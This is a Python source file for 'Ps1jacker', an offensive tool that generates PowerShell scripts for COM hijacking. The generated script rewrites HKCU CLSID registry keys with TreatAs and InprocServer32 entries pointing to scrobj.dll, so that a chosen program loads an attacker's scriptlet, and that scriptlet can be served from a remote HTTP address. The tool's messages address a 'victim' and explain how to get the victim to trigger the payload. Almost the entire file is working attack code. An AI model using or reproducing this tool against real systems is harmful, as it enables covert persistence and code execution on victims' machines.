#!usr/bin/python
import argparse
import sys

def gen_header():
    print(r"""
     _______  _______  __   _________ _______  _______  _        _______  _______ 
(  ____ )(  ____ \/  \  \__    _/(  ___  )(  ____ \| \    /\(  ____ \(  ____ )
| (    )|| (    \/\/) )    )  (  | (   ) || (    \/|  \  / /| (    \/| (    )|
| (____)|| (_____   | |    |  |  | (___) || |      |  (_/ / | (__    | (____)|
|  _____)(_____  )  | |    |  |  |  ___  || |      |   _ (  |  __)   |     __)
| (            ) |  | |    |  |  | (   ) || |      |  ( \ \ | (      | (\ (   
| )      /\____) |__) (_|\_)  )  | )   ( || (____/\|  /  \ \| (____/\| ) \ \__
|/       \_______)\____/(____/   |/     \|(_______/|_/    \/(_______/|/   \__/


------------------- Ps1jacker version ALPHA -------------------

!! I DO NOT RECOMMEND USING THIS VERSION AS IT IS STILL IN DEVELOPMENT !!

Created by: David "darkw1z" Kasabji
Twitter: @davidkasabji
Date Created: 11.08.2018

Ps1jacker is a tool that generates a PowerShell payload for COM Hijacking.
For more information type ps1jacker.py -h
    """)

def gen_default():
    print("------------------- GENERATING DEFAULT COM HIJACK METHOD -------------------")
    print("\n\nDESCRIPTION:")
    print("""This will create a powershell script which will handle Registry keys for you.
It must be used with the calc.SCT file which is in /examples directory.
The calc.SCT file must be located on victims machine under C:\\tools\\COMtest !!
When victim executes ps script, the registry will be modified and if the victim opens MSPAINT.exe, it will open Calculator instead.""")
    print("\nWARNING: As we are abusing Windows COM property, which calls on random CLSIDs, it might happen that sometimes our fake CLSID wont get triggered!")
    print("If that is so, just try to open MSPAINT.exe again and it will eventually pop calculator (or multiples!)")
    print("\n\nCODE EXECUTION:")
    print("Generating ps1jacker.ps1 ...")


    fps = open('ps1jacker.ps1', 'w')
    fps.write("""
        
# COM_Hijack

$RegPath="HKCU:Software\Classes\CLSID\\"
$ClsIdToAbuse = "{926749FA-2615-4987-8845-C33E65F2B957}"
$FakeClsid = "{00000001-0001-0001-0001-0000DEADBEEF}"

if( (Test-Path $RegPath) -eq 0 )
{
    $tempPath = "HKCU:Software\Classes\\"
    New-Item -type Directory $tempPath"CLSID" | Out-Null

}

if( (Test-Path $RegPath\$ClsIdToAbuse) -ne 0 )
{
        Remove-Item $RegPath\$ClsIdToAbuse -Force -Recurse
        Remove-Item $RegPath\$FakeClsid -Force -Recurse
        
        Execute-COM-Hijack
}
else 
{
    Execute-COM-Hijack
}

function Execute-COM-Hijack {

    New-Item -type Directory $RegPath"$ClsIdToAbuse" | Out-Null
    New-Item -type Directory $RegPath"$ClsIdToAbuse\TreatAs" | Out-Null
    New-ItemProperty $RegPath"$ClsIdToAbuse\TreatAs" "(default)" -value "{00000001-0001-0001-0001-0000DEADBEEF}" -propertyType string | Out-Null
    New-Item -type Directory $RegPath"{00000001-0001-0001-0001-0000DEADBEEF}" | Out-Null
    New-Item -type Directory $RegPath"{00000001-0001-0001-0001-0000DEADBEEF}\InprocServer32" | Out-Null
    New-ItemProperty $RegPath"{00000001-0001-0001-0001-0000DEADBEEF}\InprocServer32" "(default)" -value "C:\Windows\System32\scrobj.dll" -PropertyType string | Out-Null
    New-ItemProperty $RegPath"{00000001-0001-0001-0001-0000DEADBEEF}\InprocServer32" "ThreadingModel" -value "Apartment" -PropertyType string | Out-Null
    New-Item -type Directory $RegPath"{00000001-0001-0001-0001-0000DEADBEEF}\ScriptletURL" | Out-Null
    New-ItemProperty  $RegPath"{00000001-0001-0001-0001-0000DEADBEEF}\ScriptletURL" "(default)" -value "file://C:\\tools\COM Testing\calc.sct" | Out-Null
} 
    """)

    fps.close()
    print("Payload generated! ")
    print("\nNow make the victim trigger this payload on the target box.") 
    print("\n\n!! DO NOT FORGET THAT YOU HAVE TO TRANSFER ALSO CALC.SCT FILE TO VICITMS SPECIFIC LOCATION FOR THIS METHOD TO WORK  !!") 

def gen_custom( clsidAbuse, clsidFake, filePath):
    print("------------------- GENERATING CUSTOM COM HIJACK PAYLOAD -------------------")
    print("\n\nDESCRIPTION:")
    print("""This payload will contain your own CLSID to Hijack, your own Fake CLSID and your own script for SCT.
Please note that you cannot hijack just any process. I recommend using Procmon to determine which CLSID to go for.
Be sure to filter Procmon so you get only NAME NOT FOUND (result) and TREATAS (at the end of the path). I strongly recommend filtering by HKCU as any other
will require escalation of priviliges.
The file path to your SCT may contain a file path on victims machine or on your web server HTTP.""")

    print("\n\nCODE EXECUTION:")
    print("Generating ps1jacker.ps1 ...")

    fps = open('ps1jacker.ps1', 'w')
    fps.write("""
        
# COM_Hijack

$RegPath="HKCU:Software\Classes\CLSID\\"
$ClsIdToAbuse = '""" + clsidAbuse + """'
$FakeClsid = '""" + clsidFake + """'

if( (Test-Path $RegPath) -eq 0 )
{
    $tempPath = "HKCU:Software\Classes\\"
    New-Item -type Directory $tempPath"CLSID" | Out-Null

}

if( (Test-Path $RegPath\$ClsIdToAbuse) -ne 0 )
{
        Remove-Item $RegPath\$ClsIdToAbuse -Force -Recurse
        if( (Test-Path $RegPath\$FakeClsid ) -ne 0 )
        {
            Remove-Item $RegPath\$FakeClsid -Force -Recurse
        }
        
        Execute-COM-Hijack
}
else 
{
    Execute-COM-Hijack
}

function Execute-COM-Hijack {

    New-Item -type Directory $RegPath"$ClsIdToAbuse" | Out-Null
    New-Item -type Directory $RegPath"$ClsIdToAbuse\TreatAs" | Out-Null
    New-ItemProperty $RegPath"$ClsIdToAbuse\TreatAs" "(default)" -value $FakeClsid -propertyType string | Out-Null
    New-Item -type Directory $RegPath"$FakeClsid" | Out-Null
    New-Item -type Directory $RegPath"$FakeClsid\InprocServer32" | Out-Null
    New-ItemProperty $RegPath"$FakeClsid\InprocServer32" "(default)" -value "C:\Windows\System32\scrobj.dll" -PropertyType string | Out-Null
    New-ItemProperty $RegPath"$FakeClsid\InprocServer32" "ThreadingModel" -value "Apartment" -PropertyType string | Out-Null
    New-Item -type Directory $RegPath"$FakeClsid\ScriptletURL" | Out-Null
    New-ItemProperty  $RegPath"$FakeClsid\ScriptletURL" "(default)" -value '""" + filePath + """'  | Out-Null
} 
    """)

    fps.close()
    print("Payload generated! ")

def main():
    gen_header()
    parser = argparse.ArgumentParser()

    try:
        #parser.add_argument("-h", "--help", help="Help 101.")
        parser.add_argument("-ho", "--hijack-option", type=str, dest="hijack_option", help="File or HTTPS source.")
        parser.add_argument("-hd", "--hijack-default", dest="hijackdefault", help="Currently supported default option is MSPAINT.", action="store_true")
        parser.add_argument("-p", "--path", type=str, dest="hijackfilepath", help="Path to where the .SCT file is located on victim machine OR the HTTP destination where the file exists.")
        parser.add_argument("-ch", "--clsid-hijack", type=str, dest="clsidabuse", help="CLSID to Hijack. Be sure to provide valid CLSID, check --help for more information.")
        parser.add_argument("-cf", "--clsid-fake", type=str, dest="clsidfake", help="The Fake unique CLSID you can provide.")
        arguments = parser.parse_args()

    except SystemExit:
        raise
    except:
        print("Wrong argument provided!")
        parser.print_help()
        sys.exit(1)

    if arguments.hijackdefault:
        gen_default()
    else:
        if arguments.hijackfilepath and arguments.clsidabuse and arguments.clsidfake:
            gen_custom(arguments.clsidabuse, arguments.clsidfake, arguments.hijackfilepath)
        else:
            print("Some of the necessary arguments were not defined: hijack-file-path, clsid-abuse, clsid-fake. Exiting..")
            sys.exit(1)       

    """if arguments.hijack_option:
        hijackOption = arguments.hijack_option

    if arguments.hijack_file_path:
        hijackFilePath = arguments.hijack_file_path

    if arguments.clsid_abuse:
        clsidAbuse = arguments.clsid_abuse

    if arguments.clsid_fake:
        clsidFake = arguments.clsid_fake"""


if __name__ == "__main__":
    main()









